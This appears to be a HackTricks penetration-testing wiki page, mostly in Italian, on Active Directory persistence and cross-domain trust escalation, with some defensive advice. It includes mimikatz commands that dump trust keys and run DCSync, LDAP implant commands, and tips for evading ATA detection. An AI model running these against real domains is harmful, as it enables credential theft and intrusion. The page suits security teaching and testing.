L'oggetto **AdminSDHolder** in Active Directory assicura la sicurezza dei **privileged groups** (come Domain Admins e Enterprise Admins) applicando una standard **Access Control List (ACL)** su questi gruppi per prevenire modifiche non autorizzate. Tuttavia, questa funzionalità può essere sfruttata; se un attacker modifica l'ACL di AdminSDHolder per dare pieno accesso a un utente normale, quell'utente ottiene ampio controllo su tutti i privileged groups. Questa misura di sicurezza, pensata per proteggere, può quindi ritorcersi contro se non monitorata strettamente.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

All'interno di ogni **Domain Controller (DC)** esiste un account **local administrator**. Ottenendo diritti admin su tale macchina, l'hash dell'Administrator locale può essere estratto usando **mimikatz**. Successivamente è necessaria una modifica al registro per **enable the use of this password**, permettendo l'accesso remoto all'account Administrator locale.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Potresti **give** alcuni **special permissions** a un **user** su specifici oggetti di dominio che permetteranno all'utente di **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

I **security descriptors** sono usati per **store** i **permissions** che un **object** ha **over** un **object**. Se puoi semplicemente **make** una piccola **change** nel **security descriptor** di un oggetto, puoi ottenere privilegi molto interessanti su quell'oggetto senza necessità di essere membro di un gruppo privilegiato.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abusa della classe ausiliaria `dynamicObject` per creare principal/GPO/DNS record a vita breve con `entryTTL`/`msDS-Entry-Time-To-Die`; si auto-eliminano senza tombstones, cancellando le tracce LDAP lasciando SID orfani, riferimenti `gPLink` rotti o risposte DNS in cache (es. AdminSDHolder ACE pollution o `gPCFileSysPath`/AD-integrated DNS redirect malevoli).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifica **LSASS** in memoria per stabilire una **universal password**, concedendo accesso a tutti gli account del dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puoi creare il tuo **own SSP** per **capture** in **clear text** le **credentials** usate per accedere alla macchina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **new Domain Controller** nell'AD e lo usa per **push attributes** (SIDHistory, SPNs...) su oggetti specificati **without** lasciare log riguardo le **modifiche**. Hai bisogno di privilegi DA e di essere dentro il **root domain**.\
Nota che se usi dati sbagliati, compariranno log piuttosto brutti.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

In precedenza abbiamo discusso come escalare privilegi se hai **enough permission to read LAPS passwords**. Tuttavia, queste password possono anche essere usate per **maintain persistence**.\
Vedi:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera il **Forest** come il boundary di sicurezza. Questo implica che **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

Una [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) è un meccanismo di sicurezza che permette a un utente di un **domain** di accedere a risorse in un altro **domain**. Crea essenzialmente un collegamento tra i sistemi di autenticazione dei due domini, permettendo il flusso delle verifiche di autenticazione. Quando i domini impostano una trust, scambiano e conservano specifiche **keys** all'interno dei loro **Domain Controllers (DCs)**, che sono cruciali per l'integrità della trust.

In uno scenario tipico, se un utente intende accedere a un servizio in un **trusted domain**, deve prima richiedere un particolare ticket noto come **inter-realm TGT** dal proprio DC di dominio. Questo TGT è cifrato con una **key** di trust condivisa che entrambi i domini hanno concordato. L'utente poi presenta questo TGT al **DC of the trusted domain** per ottenere un service ticket (**TGS**). Dopo la verifica dell'inter-realm TGT da parte del DC del dominio trusted, questo emette un TGS, concedendo all'utente l'accesso al servizio.

**Steps**:

1. Un **client computer** in **Domain 1** avvia il processo usando il suo **NTLM hash** per richiedere un **Ticket Granting Ticket (TGT)** al suo **Domain Controller (DC1)**.
2. DC1 emette un nuovo TGT se il client è autenticato con successo.
3. Il client poi richiede un **inter-realm TGT** da DC1, necessario per accedere a risorse in **Domain 2**.
4. L'inter-realm TGT è cifrato con una **trust key** condivisa tra DC1 e DC2 come parte della trust a due vie tra i domini.
5. Il client porta l'inter-realm TGT al **Domain 2's Domain Controller (DC2)**.
6. DC2 verifica l'inter-realm TGT usando la trust key condivisa e, se valido, emette un **Ticket Granting Service (TGS)** per il server in Domain 2 al quale il client vuole accedere.
7. Infine, il client presenta questo TGS al server, che è cifrato con l'hash dell'account del server, per ottenere accesso al servizio in Domain 2.

### Different trusts

È importante notare che **a trust can be 1 way or 2 ways**. Nella opzione a 2 vie, entrambi i domini si fidano l'uno dell'altro, ma nella relazione di trust **1 way** uno dei domini sarà il **trusted** e l'altro il **trusting** domain. In quest'ultimo caso, **you will only be able to access resources inside the trusting domain from the trusted one**.

Se Domain A trusts Domain B, A è il trusting domain e B è il trusted. Inoltre, in **Domain A**, questa sarebbe una **Outbound trust**; e in **Domain B**, questa sarebbe una **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Configurazione comune all'interno della stessa forest, dove un child domain ha automaticamente una two-way transitive trust con il parent domain. Questo significa che le richieste di autenticazione possono fluire senza problemi tra parent e child.
- **Cross-link Trusts**: Chiamate anche "shortcut trusts", sono stabilite tra child domains per velocizzare i processi di referral. In forest complesse, i referral di autenticazione tipicamente devono salire fino alla root della forest e poi scendere al dominio target. Creando cross-links il percorso è abbreviato, particolarmente utile in ambienti geograficamente distribuiti.
- **External Trusts**: Sono stabilite tra domini diversi e non correlati e sono non-transitive. Secondo la [documentazione Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), le external trusts sono utili per accedere a risorse in un dominio al di fuori della forest corrente che non è connesso da una forest trust. La sicurezza è rafforzata tramite SID filtering con external trusts.
- **Tree-root Trusts**: Queste trust sono automaticamente stabilite tra il forest root domain e una nuova tree root aggiunta. Pur non essendo comuni, le tree-root trusts sono importanti per aggiungere nuovi domain trees a una forest, permettendo loro di mantenere un nome di dominio unico e garantendo la transitive a due vie. Maggiori informazioni sono disponibili nella [guida Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Questo tipo di trust è una two-way transitive trust tra due forest root domains, applicando anche SID filtering per migliorare la sicurezza.
- **MIT Trusts**: Queste trust sono stabilite con domini Kerberos non-Windows, conformi a [RFC4120](https://tools.ietf.org/html/rfc4120). Le MIT trusts sono più specializzate e servono ambienti che richiedono integrazione con sistemi Kerberos esterni all'ecosistema Windows.

#### Other differences in **trusting relationships**

- Una relazione di trust può anche essere **transitive** (A trust B, B trust C, quindi A trust C) o **non-transitive**.
- Una relazione di trust può essere impostata come **bidirectional trust** (entrambi si fidano) o come **one-way trust** (solo uno si fida dell'altro).

### Attack Path

1. **Enumerate** le trusting relationships
2. Controlla se qualche **security principal** (user/group/computer) ha **access** alle risorse dell'**other domain**, magari tramite ACE entries o facendo parte di gruppi dell'altro dominio. Cerca **relationships across domains** (la trust è stata creata probabilmente per questo).
1. kerberoast in questo caso potrebbe essere un'altra opzione.
3. **Compromise** gli **accounts** che possono **pivot** attraverso i domini.

Attaccanti possono accedere a risorse in un altro dominio attraverso tre meccanismi primari:

- **Local Group Membership**: Principals potrebbero essere aggiunti a gruppi locali su macchine, come il gruppo “Administrators” su un server, concedendo loro controllo significativo su quella macchina.
- **Foreign Domain Group Membership**: Principals possono anche essere membri di gruppi all'interno del dominio straniero. Tuttavia, l'efficacia di questo metodo dipende dalla natura della trust e dall'ambito del gruppo.
- **Access Control Lists (ACLs)**: Principals potrebbero essere specificati in un **ACL**, in particolare come entità in **ACEs** all'interno di una **DACL**, fornendo loro accesso a risorse specifiche. Per chi vuole approfondire la meccanica di ACLs, DACLs e ACEs, il whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” è una risorsa preziosa.

### Find external users/groups with permissions

Puoi controllare **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** per trovare foreign security principals nel dominio. Questi saranno user/group provenienti da **an external domain/forest**.

Puoi verificare questo in **Bloodhound** o usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Altri modi per enumerare i trust di dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Ci sono **2 trusted keys**, una per _Child --> Parent_ e un'altra per _Parent_ --> _Child_.\
> Puoi visualizzare quella usata dal dominio corrente con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalare a Enterprise admin nel dominio child/parent abusando del trust con SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Comprendere come la Configuration Naming Context (NC) possa essere sfruttata è cruciale. La Configuration NC funge da repository centrale per i dati di configurazione attraverso un forest in ambienti Active Directory (AD). Questi dati vengono replicati su ogni Domain Controller (DC) all'interno del forest, con writable DCs che mantengono una copia scrivibile della Configuration NC. Per sfruttare questo, è necessario avere **SYSTEM privileges on a DC**, preferibilmente un child DC.

**Link GPO to root DC site**

Il contenitore Sites della Configuration NC include informazioni sui siti di tutti i computer uniti al dominio nel forest AD. Operando con SYSTEM privileges on any DC, un attacker può collegare GPOs ai root DC sites. Questa azione può potenzialmente compromettere il root domain manipolando le policy applicate a questi siti.

Per informazioni più approfondite, si può consultare la ricerca su [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vettore d'attacco consiste nel prendere di mira gMSA privilegiati all'interno del domain. The KDS Root key, essenziale per calcolare le password delle gMSA, è memorizzata nella Configuration NC. Con SYSTEM privileges on any DC, è possibile accedere alla KDS Root key e calcolare le password di qualsiasi gMSA in tutto il forest.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Questo metodo richiede pazienza, aspettando la creazione di nuovi AD objects privilegiati. Con SYSTEM privileges, un attacker può modificare l'AD Schema per concedere a qualsiasi utente il controllo completo su tutte le classi. Questo potrebbe portare ad accesso non autorizzato e controllo sui nuovi AD objects creati.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnerabilità ADCS ESC5 prende di mira il controllo sugli oggetti PKI per creare un certificate template che permette di autenticarsi come qualsiasi utente all'interno del forest. Poiché gli oggetti PKI risiedono nella Configuration NC, compromettere un writable child DC permette di eseguire attacchi ESC5.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenari senza ADCS, l'attacker ha la capacità di impostare i componenti necessari, come discusso in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### Dominio di forest esterno - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In questo scenario **il tuo dominio è trusted** da un dominio esterno che ti concede **permessi indeterminati** su di esso. Dovrai scoprire **quali principals del tuo dominio hanno quale accesso sul dominio esterno** e poi provare a sfruttarlo:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Dominio forest esterno - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In questo scenario **il tuo dominio** sta **concedendo** alcuni **privilegi** a un principal proveniente da **domini diversi**.

Tuttavia, quando un dominio è trusted dal dominio che si fida, il dominio trusted **crea un utente** con un **nome prevedibile** e imposta come **password la password del trust**. Questo significa che è possibile **usare un utente del dominio che si fida per entrare nel dominio trusted** per enumerarlo e provare a scalare ulteriori privilegi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Un altro modo per compromettere il dominio trusted è trovare un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creato nella **direzione opposta** del trust di dominio (cosa non molto comune).

Un altro modo per compromettere il dominio trusted è aspettare su una macchina a cui un **utente del dominio trusted può accedere** tramite **RDP**. L'attaccante potrebbe quindi iniettare codice nel processo della sessione RDP e **accedere al dominio di origine della vittima** da lì. Inoltre, se la **vittima ha montato il suo hard drive**, dal processo della **sessione RDP** l'attaccante potrebbe collocare **backdoors** nella **cartella di avvio dell'hard drive**. Questa tecnica è chiamata **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigazioni per l'abuso dei trust di dominio

### **SID Filtering:**

- Il rischio di attacchi che sfruttano l'attributo SID history attraverso trust tra foreste è mitigato da SID Filtering, che è attivato per impostazione predefinita su tutti i trust inter-forest. Questo si basa sull'assunzione che i trust intra-forest siano sicuri, considerando la forest, piuttosto che il domain, come confine di sicurezza secondo la posizione di Microsoft.
- Tuttavia, c'è un problema: SID Filtering può interferire con applicazioni e accessi utente, portando alla sua disattivazione occasionale.

### **Selective Authentication:**

- Per i trust inter-forest, l'uso di Selective Authentication garantisce che gli utenti delle due foreste non vengano autenticati automaticamente. Invece, sono richieste autorizzazioni esplicite affinché gli utenti possano accedere ai domini e ai server all'interno del dominio o della forest che si fida.
- È importante notare che queste misure non proteggono contro lo sfruttamento del writable Configuration Naming Context (NC) o contro attacchi sull'account di trust.

[**Maggiori informazioni sui trust di dominio su ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Abusi di AD basati su LDAP da on-host implants

La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) reimplementa primitive LDAP in stile bloodyAD come x64 Beacon Object Files che eseguono interamente all'interno di un on-host implant (es. Adaptix C2). Gli operatori compilano il pacchetto con `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, caricano `ldap.axs`, e poi chiamano `ldap <subcommand>` dal beacon. Tutto il traffico viaggia con il contesto di sicurezza del logon corrente su LDAP (389) con signing/sealing o LDAPS (636) con trust automatico dei certificati, quindi non sono necessari proxy socks né artefatti su disco.

### Enumerazione LDAP lato implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` risolvono short names/OU paths in DN completi ed estraggono gli oggetti corrispondenti.
- `get-object`, `get-attribute`, and `get-domaininfo` recuperano attributi arbitrari (inclusi security descriptors) oltre ai metadati della forest/domain da `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` espongono roasting candidates, impostazioni di delegation e i descrittori esistenti di [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) direttamente da LDAP.
- `get-acl` e `get-writable --detailed` analizzano la DACL per elencare trustees, diritti (GenericAll/WriteDACL/WriteOwner/attribute writes) e l'ereditarietà, fornendo bersagli immediati per privilege escalation basata su ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) permettono all'operatore di posizionare nuovi principal o machine account ovunque esistano diritti su OU. `add-groupmember`, `set-password`, `add-attribute`, e `set-attribute` dirottano direttamente i target una volta trovati i diritti di write-property.
- Comandi focalizzati sulle ACL come `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, e `add-dcsync` traducono WriteDACL/WriteOwner su qualsiasi oggetto AD in reset di password, controllo della membership di gruppi, o privilegi di DCSync senza lasciare artefatti PowerShell/ADSI. I corrispettivi `remove-*` ripuliscono gli ACE iniettati.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` rendono istantaneamente un utente compromesso Kerberoastable; `add-asreproastable` (UAC toggle) lo marca per AS-REP roasting senza toccare la password.
- Macro di delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) riscrivono `msDS-AllowedToDelegateTo`, flag UAC, o `msDS-AllowedToActOnBehalfOfOtherIdentity` dal beacon, abilitando percorsi di attacco constrained/unconstrained/RBCD ed eliminando la necessità di PowerShell remoto o RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` inietta SID privilegiati nello SID history di un principal controllato (vedi [SID-History Injection](sid-history-injection.md)), fornendo ereditarietà di accesso stealth completamente via LDAP/LDAPS.
- `move-object` cambia il DN/OU di computer o utenti, permettendo a un attacker di spostare asset in OU dove esistono già diritti delegati prima di abusare di `set-password`, `add-groupmember`, o `add-spn`.
- Comandi di rimozione strettamente scoped (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ecc.) permettono un rapido rollback dopo che l'operatore ha raccolto credenziali o persistenza, minimizzando la telemetria.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Si raccomanda che i Domain Admins siano autorizzati a effettuare il login solo sui Domain Controllers, evitando il loro utilizzo su altri host.
- **Service Account Privileges**: I servizi non dovrebbero essere eseguiti con privilegi di Domain Admin (DA) per mantenere la sicurezza.
- **Temporal Privilege Limitation**: Per attività che richiedono privilegi DA, la loro durata dovrebbe essere limitata. Questo può essere ottenuto con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audita gli Event ID 2889/3074/3075 e poi applica LDAP signing più LDAPS channel binding su DCs/clients per bloccare tentativi di LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Implementare deception significa piazzare trappole, come utenti o computer decoy, con caratteristiche quali password che non scadono o che sono marcati come Trusted for Delegation. Un approccio dettagliato include la creazione di utenti con diritti specifici o l'aggiunta agli high privilege groups.
- Un esempio pratico implica l'uso di tool come: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Ulteriori informazioni sul deployment di deception sono disponibili su [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Indicatori sospetti includono ObjectSID atipico, logon rari, date di creazione, e basso conteggio di bad password.
- **General Indicators**: Confrontare gli attributi di potenziali oggetti decoy con quelli genuini può rivelare incongruenze. Tool come [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) possono aiutare a identificare tali deception.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Evitare l'enumerazione di sessioni sui Domain Controllers per prevenire il rilevamento da parte di ATA.
- **Ticket Impersonation**: Utilizzare chiavi **aes** per la creazione di ticket aiuta a evadere il rilevamento non degradando a NTLM.
- **DCSync Attacks**: Eseguire da un host non Domain Controller per evitare il rilevamento ATA è consigliato, poiché l'esecuzione diretta da un Domain Controller genererebbe alert.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
